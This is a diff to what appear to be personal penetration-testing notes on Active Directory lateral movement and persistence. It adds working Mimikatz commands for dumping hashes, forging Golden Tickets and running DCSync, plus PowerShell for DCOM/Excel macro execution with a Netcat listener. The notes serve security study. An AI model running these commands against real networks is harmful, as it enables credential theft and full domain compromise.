@@ -175,7 +175,7 @@ Active Directory Authentication
 Active Directory Lateral Movement
 
 
-	Pass the Hash
+	Pass the Hash (PtH)
 
 
 		Attacker connects to victim using SMB and performs auth using NTLM hash
@@ -195,10 +195,12 @@ Active Directory Lateral Movement
 			This works for domain accounts and the built-in local administrator account. Since the 2014 security update, this technique can not be used to authenticate as any other local admin account.
 
 	
-	Overpass the Hash
+	Overpass the Hash (OtH)
 
 
 		We can use the hash of someones password to request a Kerberos TGT, which will let us into the other services. Only works for the PC the ticket was created for/on though
+
+		The whole point is to turn the NTLM hash into a TGT so we can authenticate without using NTLM authentication.
 
 			Run Mimikatz
 			sekurlsa::logonpasswords
@@ -209,10 +211,11 @@ Active Directory Lateral Movement
 				To get a TGT, perform any action that requires admin rights
 					ex: net use \\dc01
 
-		Now that we have a TGT, we can use tools that rely on Kerberos Auth, like PsExec
+		Now that we have a TGT, we can use tools that rely on Kerberos Auth, like PsExec.
+		However, PsExec shells will only work if we use the Hostname when connecting, not the IP. Using the IP will default back to NTLM auth, and won't use the TGT.
 
 
-	Pass the Ticket
+	Pass the Ticket (PtT)
 
 
 		This abuses the TGS to authenticate to a specific service from different hosts
@@ -248,3 +251,83 @@ Active Directory Lateral Movement
 				/service 	for service type
 				/rc4 		for password hash of the service account
 				/ptt 		to put it in memory
+
+
+	DCOM - Distributed Component Object Model
+
+
+		COM was developed for same-process or cross-process interation between software components, but DCOM allows for cross computer interation. We can exploit Microsoft Office DCOM objects like the Excel.Application DCOM this way.
+
+		**See dcom.ps1 for script and details, and dcom.py for payload and details**
+
+		Requirements:
+
+			Uses RPC on TCP port 135
+			locadmin rights to launch from a compromised endpoint
+			Office installed on both endpoints
+
+		Step 1: find available methods and sub-objects for this DCOM object with Powershell
+
+			$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "TargetIP"))
+
+			$com | Get-Member
+
+			**If it shows "Run", we're in business**
+
+		Step 2: create an excel.xls file and create the evil macro.
+
+			See dcom.ps1 and dcom.py
+
+		Step 3: once created, dcom.ps1 will move it over to the target and execute the Macro
+
+			Listen on the appropriate port with Netcat
+
+
+Active Directory Persistence
+
+
+	Golden Tickets
+
+
+		When the DC uses the secret key to decrypt TGTs, that secret key is the password hash of the krbtgt domain account. If we grab that, we can make our own TGTs, or Golden Tickets, and use it in an Overpass the Hash (OtH)
+
+		By this time, we should have compromised the domain controller and should have elevated shell access on it.
+
+			Getting the krbtgt hash
+
+			Start a shell on the DC as Admin
+			Run Mimikatz
+				privilege::debug
+				lsadump::lsa /patch
+
+				This should show the krbtgt account NTLM password hash.
+
+		Creating a Golden Ticket doesn't require elevated privileges, or for the computer to be domain joined. You can make the ticket using a user that doesn't exist, since the DC trusts anything that uses the correct pw hash
+
+			Creating the Golden Ticket
+
+			kerberos::purge
+			kerberos::golden /user:fakeuser /domain:corp.com /sid:DomainSID /krbtgt:NTLMhash /ptt
+
+			This will create the ticket and load it into memory.
+			Use misc::cmd to launch a new CMD using this ticket
+			psexec \\dc01 cmd.exe
+
+
+	Domain Controller Synchronization
+
+
+		Name of the game - stealing the password hashes of any/all users.
+		We could run Mimikatz on the DC, or steal a copy of the NTDS.dit file, but both leave access trails and may need us to move tools over.
+
+		Instead, we can pose as a redundant DC and request everything by calling the IDL_DRSGetNCChanges API.
+
+			Requirements
+
+				SID with proper permissions to request the DC update, which is a Domain Admin account.
+
+			Steps
+
+				Log in as a domain admin on a compromised endpoint
+				run Mimikatz
+					lsadump::dcsync /user:administrator
